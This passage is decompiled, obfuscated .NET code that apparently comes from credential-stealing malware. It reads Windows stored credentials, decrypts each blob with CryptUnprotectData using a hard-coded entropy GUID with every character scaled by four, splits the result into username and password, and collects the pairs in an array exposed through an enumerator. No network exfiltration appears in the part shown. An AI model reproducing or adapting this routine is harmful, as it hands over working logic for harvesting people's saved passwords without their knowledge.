						lpszA = new IntPtr(lPfPwIjX.lpstrTargetName);
						text = msryxatn33(lpszA);
						goto IL_02b7;
						IL_02b7:
						num = 47;
						pOptionalEntropy.cbData = 74;
						goto IL_02c4;
						IL_02c4:
						num = 48;
						intPtr = Marshal.AllocHGlobal(74);
						goto IL_02d1;
						IL_02d1:
						num = 49;
						text3 = "abe2869f-9b47-4cd9-a358-c22904dba7f7\0";
						goto IL_02dc;
						IL_02dc:
						num = 50;
						num12 = 0;
						goto IL_02f5;
						IL_02f5:
						num = 51;
						Marshal.WriteInt16(intPtr, num12 * 2, (short)(Strings.Asc(Strings.Mid(text3, num12 + 1, 1)) * 4));
						goto IL_02e5;
						IL_02e5:
						num = 52;
						num12++;
						if (num12 <= 36)
						{
							goto IL_02f5;
						}
						goto IL_031a;
						IL_031a:
						num = 53;
						pOptionalEntropy.pbData = intPtr.ToInt32();
						goto IL_032c;
						IL_032c:
						num = 54;
						pDataIn.pbData = lPfPwIjX.lpbCredentialBlob;
						goto IL_033e;
						IL_033e:
						num = 55;
						pDataIn.cbData = lPfPwIjX.dwCredentialBlobSize;
						goto IL_0350;
						IL_0350:
						num = 56;
						pDataOut.cbData = 0;
						goto IL_035c;
						IL_035c:
						num = 57;
						pDataOut.pbData = 0;
						goto IL_0368;
						IL_0368:
						num = 58;
						CryptUnprotectData_1(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
						goto IL_037c;
						IL_037c:
						num = 59;
						Marshal.FreeHGlobal(intPtr);
						goto IL_0387;
						IL_0387:
						num = 60;
						lpszA = new IntPtr(pDataOut.pbData);
						text4 = Marshal.PtrToStringUni(lpszA);
						goto IL_03a2;
						IL_03a2:
						num = 61;
						array = Strings.Split(text4, ":", -1, (CompareMethod)0);
						goto IL_03b6;
						IL_03b6:
						num = 62;
						num5 = Strings.InStr(Strings.Mid(text, 19), "/", (CompareMethod)0);
						goto IL_03d0;
						IL_03d0:
						num = 63;
						snEaE1qu15_0 = (snEaE1qu15[])Utils.CopyArray((Array)snEaE1qu15_0, (Array)new snEaE1qu15[num8 + 1]);
						goto IL_03f8;
						IL_03f8:
						num = 66;
						num7 = num8;
						goto IL_0400;
						IL_0400:
						num = 67;
						snEaE1qu15_0[num7].strUserName = array[0];
						goto IL_041a;
						IL_041a:
						num = 68;
						snEaE1qu15_0[num7].strPassword = array[1];
						goto IL_0434;
						end_IL_0000_2:
						break;
					}
					num = 80;
					CredFree(lppCredentials);
					break;
				}
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 1563;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public IEnumerator GetEnumerator()
	{
		Reset();
		return this;
	}

	public void Reset()
	{
		rFLB4uRd35();
		int_0 = 0;
	}

	public bool MoveNext()
	{
		if (snEaE1qu15_0 == null)
		{
			return false;
		}
		return int_0 < snEaE1qu15_0.Length;
	}
}
